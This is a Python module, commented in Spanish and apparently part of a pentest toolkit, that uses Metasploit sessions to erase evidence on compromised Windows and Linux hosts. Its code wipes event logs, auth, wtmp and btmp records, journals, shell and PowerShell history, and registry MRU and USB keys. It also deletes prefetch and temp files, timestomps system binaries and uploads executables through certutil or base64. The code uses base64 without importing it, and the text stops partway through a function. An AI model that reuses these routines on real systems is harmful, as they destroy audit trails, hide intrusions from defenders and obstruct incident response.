#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import argparse
import subprocess
import logging
import random
import time
import re
from datetime import datetime
from pymetasploit3.msfrpc import MsfRpcClient

# Configuración de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/opt/pentest/temp/evidence-cleanup.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('evidence-cleanup')

class EvidenceCleanup:
    def __init__(self, config_file='/opt/pentest/config/cleanup-config.json'):
        """Inicializa el módulo de limpieza de evidencias con configuración desde archivo"""
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            logger.error(f"Archivo de configuración no encontrado: {config_file}")
            # Configuración por defecto
            self.config = {
                "timeout": 60,
                "msf_host": "127.0.0.1",
                "msf_port": 55553,
                "msf_user": "msf",
                "msf_pass": "msf",
                "cleanup_techniques": [
                    "logs_deletion",
                    "file_timestomp",
                    "command_history",
                    "temp_files",
                    "session_artifacts",
                    "registry_keys"
                ],
                "log_patterns": {
                    "windows": [
                        "Security",
                        "System",
                        "Application",
                        "PowerShell",
                        "Windows Defender"
                    ],
                    "linux": [
                        "auth.log",
                        "syslog",
                        "messages",
                        "secure",
                        "audit.log"
                    ]
                },
                "temp_directories": {
                    "windows": [
                        "C:\\Windows\\Temp",
                        "C:\\Users\\*\\AppData\\Local\\Temp",
                        "C:\\Users\\*\\Downloads"
                    ],
                    "linux": [
                        "/tmp",
                        "/var/tmp",
                        "/dev/shm"
                    ]
                }
            }
        
        # Comprobar si se está ejecutando metasploit RPC
        self.msf_client = None
        self.msf_initialized = False
        self.attempts_to_start_msf = 0
        self.max_attempts = 3
    
    def initialize_msf(self):
        """Inicializa la conexión con Metasploit Framework RPC"""
        if self.msf_initialized:
            return True
        
        if self.attempts_to_start_msf >= self.max_attempts:
            logger.error("Número máximo de intentos para iniciar MSF alcanzado")
            return False
        
        try:
            # Intentar conectar con el servicio RPC existente
            self.msf_client = MsfRpcClient(
                self.config.get("msf_pass", "msf"),
                server=self.config.get("msf_host", "127.0.0.1"),
                port=self.config.get("msf_port", 55553),
                ssl=False,
                username=self.config.get("msf_user", "msf")
            )
            
            # Verificar la conexión
            if self.msf_client and hasattr(self.msf_client, 'core'):
                msf_version = self.msf_client.core.version()
                logger.info(f"Conexión establecida con Metasploit Framework: {msf_version}")
                self.msf_initialized = True
                return True
            else:
                raise Exception("Conexión establecida pero API no accesible")
        
        except Exception as e:
            logger.warning(f"Error al conectar con Metasploit RPC: {str(e)}")
            logger.info(f"Intentando iniciar el servicio MSF RPC (intento {self.attempts_to_start_msf + 1})")
            
            # Iniciar el servicio MSF RPC
            try:
                cmd = [
                    "msfrpcd",
                    "-P", self.config.get("msf_pass", "msf"),
                    "-U", self.config.get("msf_user", "msf"),
                    "-a", self.config.get("msf_host", "127.0.0.1"),
                    "-p", str(self.config.get("msf_port", 55553)),
                    "-S", "false"
                ]
                
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                time.sleep(10)  # Dar tiempo a que inicie
                
                self.attempts_to_start_msf += 1
                return self.initialize_msf()  # Intentar reconectar
            except Exception as e:
                logger.error(f"Error al iniciar servicio MSF RPC: {str(e)}")
                self.attempts_to_start_msf += 1
                return False
    
    def run_command_on_session(self, session_id, command, timeout=30):
        """Ejecuta un comando en una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return None
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return None
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            result = None
            
            # Ejecutar comando según tipo de sesión
            if session_type == 'meterpreter':
                # Ejecutar comando en meterpreter
                result = session.run_with_output(command, timeout)
            
            elif session_type in ['shell', 'ssh']:
                # Ejecutar comando en shell
                session.write(f"{command}\n")
                
                # Esperar respuesta
                time.sleep(2)  # Dar tiempo a que se ejecute
                
                # Leer resultado
                result = session.read()
                
                # Esperar más tiempo para comandos largos
                attempts = 0
                while "..." in result and attempts < 5:
                    time.sleep(1)
                    result += session.read()
                    attempts += 1
            
            return result
        
        except Exception as e:
            logger.error(f"Error al ejecutar comando en sesión: {str(e)}")
            return None
    
    def upload_file_to_session(self, session_id, local_file, remote_file):
        """Sube un archivo a una sesión de Metasploit"""
        if not self.initialize_msf():
            logger.error("No se pudo inicializar Metasploit RPC")
            return False
        
        try:
            # Verificar tipo de sesión
            sessions = self.msf_client.sessions.list
            if str(session_id) not in sessions:
                logger.error(f"La sesión {session_id} no existe")
                return False
            
            session = self.msf_client.sessions.session(session_id)
            session_type = sessions[str(session_id)]['type']
            
            # Solo meterpreter soporta upload directo
            if session_type == 'meterpreter':
                result = session.run_with_output(f"upload {local_file} {remote_file}")
                return "uploaded" in result.lower()
            
            elif session_type == 'shell':
                # Para shell, codificar archivo en base64 y decodificar en destino
                try:
                    # Leer archivo y codificar
                    with open(local_file, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode('utf-8')
                    
                    # Comprobar si es sistema Windows o Unix
                    result = self.run_command_on_session(session_id, "uname -a")
                    is_windows = "Windows" in result
                    
                    if is_windows:
                        # En Windows, usar certutil
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo {chunk} >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con certutil
                        decode_cmd = f'certutil -decode {temp_b64} {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'del {temp_b64}')
                        
                    else:
                        # En Unix, usar base64
                        temp_b64 = remote_file + ".b64"
                        
                        # Escribir contenido codificado en archivo temporal
                        for i in range(0, len(file_data), 500):
                            chunk = file_data[i:i+500]
                            echo_cmd = f'echo "{chunk}" >> {temp_b64}'
                            self.run_command_on_session(session_id, echo_cmd)
                        
                        # Decodificar con base64
                        decode_cmd = f'base64 -d {temp_b64} > {remote_file}'
                        self.run_command_on_session(session_id, decode_cmd)
                        
                        # Dar permisos de ejecución
                        self.run_command_on_session(session_id, f'chmod +x {remote_file}')
                        
                        # Eliminar archivo temporal
                        self.run_command_on_session(session_id, f'rm {temp_b64}')
                    
                    return True
                
                except Exception as e:
                    logger.error(f"Error al subir archivo a sesión shell: {str(e)}")
                    return False
            
            return False
        
        except Exception as e:
            logger.error(f"Error al subir archivo: {str(e)}")
            return False
    
    def cleanup_windows_logs(self, session_id):
        """Limpia registros de eventos y logs en Windows"""
        result = {
            "success": False,
            "logs_cleaned": [],
            "errors": []
        }
        
        try:
            logger.info(f"Limpiando logs de Windows en sesión {session_id}")
            
            # Verificar si podemos usar los comandos
            permission_check = self.run_command_on_session(session_id, "whoami")
            is_admin = False
            
            if permission_check and ("nt authority\\system" in permission_check.lower() or 
                                    "administrator" in permission_check.lower()):
                is_admin = True
            
            if not is_admin:
                result["errors"].append("Se requieren privilegios elevados para limpiar logs")
                logger.warning("Se requieren privilegios elevados para limpiar logs de Windows")
                return result
            
            # Limpiar logs del sistema usando wevtutil
            log_patterns = self.config.get("log_patterns", {}).get("windows", [])
            
            for log_name in log_patterns:
                try:
                    # Primero verificar si existe el log
                    check_cmd = f'wevtutil.exe gl "{log_name}" 2>&1'
                    check_output = self.run_command_on_session(session_id, check_cmd)
                    
                    if "The system cannot find" not in check_output and "No está" not in check_output:
                        # Limpiar log
                        clear_cmd = f'wevtutil.exe cl "{log_name}" 2>&1'
                        clear_output = self.run_command_on_session(session_id, clear_cmd)
                        
                        if not clear_output or "error" not in clear_output.lower():
                            result["logs_cleaned"].append(log_name)
                            logger.info(f"Log {log_name} limpiado correctamente")
                        else:
                            result["errors"].append(f"Error al limpiar log {log_name}: {clear_output}")
                            logger.warning(f"Error al limpiar log {log_name}: {clear_output}")
                except Exception as e:
                    result["errors"].append(f"Error al procesar log {log_name}: {str(e)}")
                    logger.error(f"Error al procesar log {log_name}: {str(e)}")
            
            # Limpiar registros de PowerShell
            try:
                # Eliminar archivos de historial de PowerShell
                ps_history_cmd = 'Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue'
                ps_cmd = f'powershell.exe -Command "{ps_history_cmd}"'
                self.run_command_on_session(session_id, ps_cmd)
                
                result["logs_cleaned"].append("PowerShell_History")
                logger.info("Historial de PowerShell limpiado")
            except Exception as e:
                result["errors"].append(f"Error al limpiar historial de PowerShell: {str(e)}")
                logger.error(f"Error al limpiar historial de PowerShell: {str(e)}")
            
            # Si se limpiaron algunos logs, consideramos éxito parcial
            if result["logs_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de logs: {str(e)}")
            logger.error(f"Error general en limpieza de logs de Windows: {str(e)}")
        
        return result
    
    def cleanup_linux_logs(self, session_id):
        """Limpia registros de eventos y logs en Linux"""
        result = {
            "success": False,
            "logs_cleaned": [],
            "errors": []
        }
        
        try:
            logger.info(f"Limpiando logs de Linux en sesión {session_id}")
            
            # Verificar si podemos usar los comandos
            permission_check = self.run_command_on_session(session_id, "id")
            is_root = False
            
            if permission_check and "uid=0" in permission_check:
                is_root = True
            
            if not is_root:
                result["errors"].append("Se requieren privilegios de root para limpiar logs")
                logger.warning("Se requieren privilegios de root para limpiar logs de Linux")
                return result
            
            # Limpiar logs comunes
            log_patterns = self.config.get("log_patterns", {}).get("linux", [])
            common_log_paths = [
                "/var/log/",
                "/var/adm/",
                "/var/spool/",
                "/var/audit/"
            ]
            
            for log_path in common_log_paths:
                for log_name in log_patterns:
                    try:
                        # Verificar si existe el archivo
                        check_cmd = f'ls -la {log_path}{log_name}* 2>/dev/null'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if check_output and "No such file" not in check_output:
                            # Limpiar log
                            truncate_cmd = f'cat /dev/null > {log_path}{log_name}'
                            truncate_output = self.run_command_on_session(session_id, truncate_cmd)
                            
                            # Verificar si se limpió
                            size_cmd = f'ls -la {log_path}{log_name}'
                            size_output = self.run_command_on_session(session_id, size_cmd)
                            
                            if "0 " in size_output or " 0 " in size_output:
                                result["logs_cleaned"].append(f"{log_path}{log_name}")
                                logger.info(f"Log {log_path}{log_name} limpiado correctamente")
                            else:
                                result["errors"].append(f"No se pudo verificar limpieza de {log_path}{log_name}")
                                logger.warning(f"No se pudo verificar limpieza de {log_path}{log_name}")
                    except Exception as e:
                        result["errors"].append(f"Error al procesar log {log_path}{log_name}: {str(e)}")
                        logger.error(f"Error al procesar log {log_path}{log_name}: {str(e)}")
            
            # Limpiar registros de comandos
            try:
                # Limpiar historial de bash
                bash_cmd = 'cat /dev/null > ~/.bash_history && history -c'
                self.run_command_on_session(session_id, bash_cmd)
                
                # Limpiar historial de otros shells
                self.run_command_on_session(session_id, 'cat /dev/null > ~/.zsh_history 2>/dev/null')
                self.run_command_on_session(session_id, 'cat /dev/null > ~/.ash_history 2>/dev/null')
                self.run_command_on_session(session_id, 'cat /dev/null > ~/.ksh_history 2>/dev/null')
                
                result["logs_cleaned"].append("Shell_History")
                logger.info("Historiales de shell limpiados")
            except Exception as e:
                result["errors"].append(f"Error al limpiar historial de shell: {str(e)}")
                logger.error(f"Error al limpiar historial de shell: {str(e)}")
            
            # Limpiar wtmp y utmp (registros de login)
            try:
                self.run_command_on_session(session_id, 'cat /dev/null > /var/log/wtmp 2>/dev/null')
                self.run_command_on_session(session_id, 'cat /dev/null > /var/log/utmp 2>/dev/null')
                self.run_command_on_session(session_id, 'cat /dev/null > /var/log/btmp 2>/dev/null')
                
                result["logs_cleaned"].append("Login_Records")
                logger.info("Registros de login limpiados")
            except Exception as e:
                result["errors"].append(f"Error al limpiar registros de login: {str(e)}")
                logger.error(f"Error al limpiar registros de login: {str(e)}")
            
            # Limpiar journal si existe
            try:
                journal_check = self.run_command_on_session(session_id, 'command -v journalctl')
                if journal_check and "not found" not in journal_check:
                    self.run_command_on_session(session_id, 'journalctl --vacuum-time=1s')
                    result["logs_cleaned"].append("Journal")
                    logger.info("Journal limpiado")
            except Exception as e:
                result["errors"].append(f"Error al limpiar journal: {str(e)}")
                logger.error(f"Error al limpiar journal: {str(e)}")
            
            # Si se limpiaron algunos logs, consideramos éxito parcial
            if result["logs_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de logs: {str(e)}")
            logger.error(f"Error general en limpieza de logs de Linux: {str(e)}")
        
        return result
    
    def cleanup_command_history(self, session_id, platform):
        """Limpia historial de comandos"""
        result = {
            "success": False,
            "history_cleaned": [],
            "errors": []
        }
        
        try:
            logger.info(f"Limpiando historial de comandos en sesión {session_id}")
            
            if "windows" in platform.lower():
                # Limpiar historial de PowerShell
                try:
                    history_cmd = 'powershell.exe -Command "Clear-History -ErrorAction SilentlyContinue; Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue"'
                    self.run_command_on_session(session_id, history_cmd)
                    
                    result["history_cleaned"].append("PowerShell_History")
                    logger.info("Historial de PowerShell limpiado")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar historial de PowerShell: {str(e)}")
                    logger.error(f"Error al limpiar historial de PowerShell: {str(e)}")
                
                # Limpiar historial de cmd
                try:
                    # Limpiar historial de cmd usando un registro
                    cmd_history = 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\History" /v ClearRecentDocsOnExit /t REG_DWORD /d 1 /f'
                    self.run_command_on_session(session_id, cmd_history)
                    
                    # Borrar historial de comandos recientes
                    self.run_command_on_session(session_id, 'doskey /reinstall')
                    
                    result["history_cleaned"].append("CMD_History")
                    logger.info("Historial de CMD limpiado")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar historial de CMD: {str(e)}")
                    logger.error(f"Error al limpiar historial de CMD: {str(e)}")
                
                # Limpiar historial de ejecución reciente (Run)
                try:
                    run_history = 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f'
                    self.run_command_on_session(session_id, run_history)
                    
                    result["history_cleaned"].append("Run_History")
                    logger.info("Historial de ejecución reciente limpiado")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar historial de ejecución reciente: {str(e)}")
                    logger.error(f"Error al limpiar historial de ejecución reciente: {str(e)}")
            
            else:  # Linux/Unix
                # Limpiar historial de bash y otros shells
                try:
                    # Limpiar historial actual
                    self.run_command_on_session(session_id, 'history -c')
                    
                    # Limpiar archivos de historial
                    self.run_command_on_session(session_id, 'cat /dev/null > ~/.bash_history 2>/dev/null')
                    self.run_command_on_session(session_id, 'cat /dev/null > ~/.zsh_history 2>/dev/null')
                    self.run_command_on_session(session_id, 'cat /dev/null > ~/.ash_history 2>/dev/null')
                    self.run_command_on_session(session_id, 'cat /dev/null > ~/.ksh_history 2>/dev/null')
                    
                    # Establecer HISTSIZE a 0 para evitar guardar más historial
                    self.run_command_on_session(session_id, 'export HISTSIZE=0')
                    self.run_command_on_session(session_id, 'export HISTFILESIZE=0')
                    
                    result["history_cleaned"].append("Shell_History")
                    logger.info("Historial de shell limpiado")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar historial de shell: {str(e)}")
                    logger.error(f"Error al limpiar historial de shell: {str(e)}")
                
                # Limpiar historial de comandos sudo
                try:
                    self.run_command_on_session(session_id, 'sudo rm -f /var/log/auth.log /var/log/auth.log.* 2>/dev/null')
                    
                    result["history_cleaned"].append("Sudo_History")
                    logger.info("Historial de sudo limpiado")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar historial de sudo: {str(e)}")
                    logger.error(f"Error al limpiar historial de sudo: {str(e)}")
            
            # Si se limpiaron algunos historiales, consideramos éxito parcial
            if result["history_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de historial: {str(e)}")
            logger.error(f"Error general en limpieza de historial: {str(e)}")
        
        return result
    
    def cleanup_temp_files(self, session_id, platform):
        """Limpia archivos temporales y artefactos"""
        result = {
            "success": False,
            "files_cleaned": [],
            "errors": []
        }
        
        try:
            logger.info(f"Limpiando archivos temporales en sesión {session_id}")
            
            if "windows" in platform.lower():
                # Obtener directorios temporales
                temp_directories = self.config.get("temp_directories", {}).get("windows", [])
                
                # Expandir comodines en rutas
                expanded_dirs = []
                for dir_pattern in temp_directories:
                    if "*" in dir_pattern:
                        # Expandir comodines usando dir
                        dir_cmd = f'dir /b /ad {dir_pattern}'
                        dir_output = self.run_command_on_session(session_id, dir_cmd)
                        
                        if dir_output and "File Not Found" not in dir_output:
                            for line in dir_output.splitlines():
                                if line.strip():
                                    expanded_path = dir_pattern.replace("*", line.strip())
                                    expanded_dirs.append(expanded_path)
                    else:
                        expanded_dirs.append(dir_pattern)
                
                # Limpiar cada directorio
                for temp_dir in expanded_dirs:
                    try:
                        # Verificar si existe el directorio
                        check_cmd = f'dir /a "{temp_dir}" 2>&1'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if "File Not Found" not in check_output and "No se encuentra" not in check_output:
                            # Eliminar archivos
                            del_cmd = f'del /f /q /s "{temp_dir}\\*" 2>&1'
                            del_output = self.run_command_on_session(session_id, del_cmd)
                            
                            result["files_cleaned"].append(temp_dir)
                            logger.info(f"Archivos temporales en {temp_dir} eliminados")
                    except Exception as e:
                        result["errors"].append(f"Error al limpiar directorio {temp_dir}: {str(e)}")
                        logger.error(f"Error al limpiar directorio {temp_dir}: {str(e)}")
                
                # Limpiar archivos de prefetch
                try:
                    prefetch_cmd = 'del /f /q /s "C:\\Windows\\Prefetch\\*" 2>&1'
                    prefetch_output = self.run_command_on_session(session_id, prefetch_cmd)
                    
                    if "Access is denied" not in prefetch_output:
                        result["files_cleaned"].append("C:\\Windows\\Prefetch")
                        logger.info("Archivos de prefetch eliminados")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar archivos de prefetch: {str(e)}")
                    logger.error(f"Error al limpiar archivos de prefetch: {str(e)}")
                
                # Limpiar Recent Items
                try:
                    recent_cmd = 'del /f /q /s "%APPDATA%\\Microsoft\\Windows\\Recent\\*" 2>&1'
                    recent_output = self.run_command_on_session(session_id, recent_cmd)
                    
                    result["files_cleaned"].append("%APPDATA%\\Microsoft\\Windows\\Recent")
                    logger.info("Archivos recientes eliminados")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar archivos recientes: {str(e)}")
                    logger.error(f"Error al limpiar archivos recientes: {str(e)}")
            
            else:  # Linux/Unix
                # Obtener directorios temporales
                temp_directories = self.config.get("temp_directories", {}).get("linux", [])
                
                # Limpiar cada directorio
                for temp_dir in temp_directories:
                    try:
                        # Verificar si existe el directorio
                        check_cmd = f'ls -la {temp_dir} 2>/dev/null'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if check_output and "No such file" not in check_output:
                            # Eliminar archivos (excepto . y ..)
                            rm_cmd = f'find {temp_dir} -type f -exec rm -f {{}} \\; 2>/dev/null'
                            self.run_command_on_session(session_id, rm_cmd)
                            
                            # Verificar resultado
                            verify_cmd = f'find {temp_dir} -type f | wc -l'
                            verify_output = self.run_command_on_session(session_id, verify_cmd)
                            
                            if verify_output and int(verify_output.strip()) < 10:  # Asumir éxito si quedan menos de 10 archivos
                                result["files_cleaned"].append(temp_dir)
                                logger.info(f"Archivos temporales en {temp_dir} eliminados")
                    except Exception as e:
                        result["errors"].append(f"Error al limpiar directorio {temp_dir}: {str(e)}")
                        logger.error(f"Error al limpiar directorio {temp_dir}: {str(e)}")
                
                # Limpiar otros archivos temporales específicos
                try:
                    # Limpiar cachés de apt/yum/dnf si existen
                    self.run_command_on_session(session_id, 'rm -rf /var/cache/apt/archives/*.deb 2>/dev/null')
                    self.run_command_on_session(session_id, 'rm -rf /var/cache/yum/* 2>/dev/null')
                    self.run_command_on_session(session_id, 'rm -rf /var/cache/dnf/* 2>/dev/null')
                    
                    # Limpiar thumbnail cache
                    self.run_command_on_session(session_id, 'rm -rf ~/.cache/thumbnails/* 2>/dev/null')
                    
                    result["files_cleaned"].append("Package_Caches")
                    logger.info("Cachés de paquetes eliminados")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar cachés de sistema: {str(e)}")
                    logger.error(f"Error al limpiar cachés de sistema: {str(e)}")
            
            # Si se limpiaron algunos archivos, consideramos éxito parcial
            if result["files_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de archivos temporales: {str(e)}")
            logger.error(f"Error general en limpieza de archivos temporales: {str(e)}")
        
        return result
    
    def cleanup_registry_keys(self, session_id):
        """Limpia claves de registro relevantes en Windows"""
        result = {
            "success": False,
            "keys_cleaned": [],
            "errors": []
        }
        
        try:
            logger.info(f"Limpiando claves de registro en sesión {session_id}")
            
            # Verificar si podemos usar los comandos
            permission_check = self.run_command_on_session(session_id, "whoami")
            has_permission = False
            
            if permission_check and ("system" in permission_check.lower() or 
                                     "admin" in permission_check.lower()):
                has_permission = True
            
            if not has_permission:
                result["errors"].append("Se requieren privilegios para modificar el registro")
                logger.warning("Se requieren privilegios para modificar el registro")
                return result
            
            # Limpiar claves de registro comunes
            registry_keys = [
                # MRU (Most Recently Used)
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "type": "delete"},
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", "type": "delete"},
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU", "type": "delete"},
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU", "type": "delete"},
                
                # UserAssist (programas ejecutados)
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist", "type": "clean"},
                
                # RecentDocs
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", "type": "clean"},
                
                # Dispositivos USB
                {"path": "HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR", "type": "clean"},
                
                # Actividad de red
                {"path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections", "type": "clean"}
            ]
            
            for key_info in registry_keys:
                try:
                    path = key_info["path"]
                    action = key_info["type"]
                    
                    if action == "delete":
                        # Eliminar clave completa
                        cmd = f'reg delete "{path}" /f'
                        output = self.run_command_on_session(session_id, cmd)
                        
                        if "ERROR" not in output and "error" not in output.lower():
                            result["keys_cleaned"].append(path)
                            logger.info(f"Clave de registro {path} eliminada")
                    
                    elif action == "clean":
                        # Verificar si existe la clave
                        check_cmd = f'reg query "{path}" 2>&1'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if "ERROR" not in check_output and "error" not in check_output.lower():
                            # Obtener subclaves y limpiar cada una
                            query_cmd = f'reg query "{path}" /s'
                            query_output = self.run_command_on_session(session_id, query_cmd)
                            
                            if query_output:
                                # Extraer subclaves
                                subkeys = []
                                current_key = None
                                
                                for line in query_output.splitlines():
                                    if line.startswith("HKEY_") or line.startswith("HKCU\\") or line.startswith("HKLM\\"):
                                        current_key = line.strip()
                                        if current_key != path:
                                            subkeys.append(current_key)
                                
                                # Eliminar cada subclave
                                for subkey in subkeys:
                                    del_cmd = f'reg delete "{subkey}" /f'
                                    self.run_command_on_session(session_id, del_cmd)
                            
                            result["keys_cleaned"].append(path)
                            logger.info(f"Clave de registro {path} limpiada")
                except Exception as e:
                    result["errors"].append(f"Error al limpiar clave {path}: {str(e)}")
                    logger.error(f"Error al limpiar clave {path}: {str(e)}")
            
            # Limpiar AppCompatFlags (compatibilidad de programas ejecutados)
            try:
                compat_path = "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store"
                cmd = f'reg delete "{compat_path}" /f'
                output = self.run_command_on_session(session_id, cmd)
                
                if "ERROR" not in output and "error" not in output.lower():
                    result["keys_cleaned"].append(compat_path)
                    logger.info(f"Clave de registro {compat_path} eliminada")
            except Exception as e:
                result["errors"].append(f"Error al limpiar clave AppCompatFlags: {str(e)}")
                logger.error(f"Error al limpiar clave AppCompatFlags: {str(e)}")
            
            # Si se limpiaron algunas claves, consideramos éxito parcial
            if result["keys_cleaned"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en limpieza de registro: {str(e)}")
            logger.error(f"Error general en limpieza de registro: {str(e)}")
        
        return result
    
    def timestomp_files(self, session_id, platform, files_to_modify=None):
        """Modifica timestamps de archivos para ocultar actividad"""
        result = {
            "success": False,
            "files_modified": [],
            "errors": []
        }
        
        try:
            logger.info(f"Modificando timestamps de archivos en sesión {session_id}")
            
            # Si no se especifican archivos, usar lista predeterminada
            if not files_to_modify:
                if "windows" in platform.lower():
                    files_to_modify = [
                        "C:\\Windows\\System32\\cmd.exe",
                        "C:\\Windows\\System32\\powershell.exe",
                        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                        "C:\\Windows\\System32\\whoami.exe",
                        "C:\\Windows\\System32\\net.exe",
                        "C:\\Windows\\System32\\netstat.exe",
                        "C:\\Windows\\System32\\ipconfig.exe"
                    ]
                else:  # Linux/Unix
                    files_to_modify = [
                        "/bin/bash",
                        "/bin/sh",
                        "/usr/bin/ssh",
                        "/bin/ls",
                        "/usr/bin/find",
                        "/bin/cp",
                        "/bin/mv"
                    ]
            
            # Obtener fechas de referencia de archivos de sistema no modificados
            reference_file = None
            reference_times = None
            
            if "windows" in platform.lower():
                # Obtener tiempos de notepad.exe u otro archivo de sistema
                ref_output = self.run_command_on_session(session_id, 'dir /T:W "C:\\Windows\\System32\\notepad.exe"')
                
                if ref_output and "File Not Found" not in ref_output:
                    reference_file = "C:\\Windows\\System32\\notepad.exe"
                else:
                    ref_output = self.run_command_on_session(session_id, 'dir /T:W "C:\\Windows\\System32\\calc.exe"')
                    if ref_output and "File Not Found" not in ref_output:
                        reference_file = "C:\\Windows\\System32\\calc.exe"
            else:
                # Obtener tiempos de /bin/true u otro archivo de sistema raramente modificado
                ref_output = self.run_command_on_session(session_id, 'ls -la --time-style=full-iso /bin/true')
                
                if ref_output and "No such file" not in ref_output:
                    reference_file = "/bin/true"
                else:
                    ref_output = self.run_command_on_session(session_id, 'ls -la --time-style=full-iso /bin/false')
                    if ref_output and "No such file" not in ref_output:
                        reference_file = "/bin/false"
            
            # Modificar timestamps de archivos
            if "windows" in platform.lower():
                # En Windows, usar PowerShell para modificar timestamps
                for file_path in files_to_modify:
                    try:
                        # Verificar si existe el archivo
                        check_cmd = f'dir "{file_path}" 2>&1'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if "File Not Found" not in check_output and "No se encuentra" not in check_output:
                            if reference_file:
                                # Copiar timestamps del archivo de referencia
                                ps_cmd = f'powershell.exe -Command "$ref = Get-Item \'{reference_file}\'; $target = Get-Item \'{file_path}\'; $target.CreationTime = $ref.CreationTime; $target.LastAccessTime = $ref.LastAccessTime; $target.LastWriteTime = $ref.LastWriteTime"'
                                self.run_command_on_session(session_id, ps_cmd)
                            else:
                                # Usar una fecha específica (un mes atrás)
                                ps_cmd = f'powershell.exe -Command "$date = (Get-Date).AddMonths(-1); $target = Get-Item \'{file_path}\'; $target.CreationTime = $date; $target.LastAccessTime = $date; $target.LastWriteTime = $date"'
                                self.run_command_on_session(session_id, ps_cmd)
                            
                            # Verificar si se modificaron los timestamps
                            verify_cmd = f'dir /T:W "{file_path}"'
                            verify_output = self.run_command_on_session(session_id, verify_cmd)
                            
                            result["files_modified"].append(file_path)
                            logger.info(f"Timestamps modificados para {file_path}")
                    except Exception as e:
                        result["errors"].append(f"Error al modificar timestamps de {file_path}: {str(e)}")
                        logger.error(f"Error al modificar timestamps de {file_path}: {str(e)}")
            
            else:  # Linux/Unix
                # En Linux, usar touch para modificar timestamps
                for file_path in files_to_modify:
                    try:
                        # Verificar si existe el archivo
                        check_cmd = f'ls -la {file_path} 2>/dev/null'
                        check_output = self.run_command_on_session(session_id, check_cmd)
                        
                        if check_output and "No such file" not in check_output:
                            if reference_file:
                                # Copiar timestamps del archivo de referencia
                                touch_cmd = f'touch -r {reference_file} {file_path}'
                                self.run_command_on_session(session_id, touch_cmd)
                            else:
                                # Usar una fecha específica (un mes atrás)
                                date_cmd = 'date -d "1 month ago" +"%Y%m%d%H%M.%S"'
                                date_output = self.run_command_on_session(session_id, date_cmd)
                                
                                if date_output:
                                    touch_cmd = f'touch -t {date_output.strip()} {file_path}'
                                    self.run_command_on_session(session_id, touch_cmd)
                            
                            # Verificar si se modificaron los timestamps
                            verify_cmd = f'ls -la --time-style=full-iso {file_path}'
                            verify_output = self.run_command_on_session(session_id, verify_cmd)
                            
                            result["files_modified"].append(file_path)
                            logger.info(f"Timestamps modificados para {file_path}")
                    except Exception as e:
                        result["errors"].append(f"Error al modificar timestamps de {file_path}: {str(e)}")
                        logger.error(f"Error al modificar timestamps de {file_path}: {str(e)}")
            
            # Si se modificaron algunos archivos, consideramos éxito parcial
            if result["files_modified"]:
                result["success"] = True
        
        except Exception as e:
            result["errors"].append(f"Error general en modificación de timestamps: {str(e)}")
            logger.error(f"Error general en modificación de timestamps: {str(e)}")
        
        return result
    
    def cleanup_session_artifacts(self, session_id, platform):
        """Limpia artefactos específicos de la sesión"""
        result = {
            "success": False,
            "artifacts_cleaned": [],
            "errors": []
        }
        
        try:
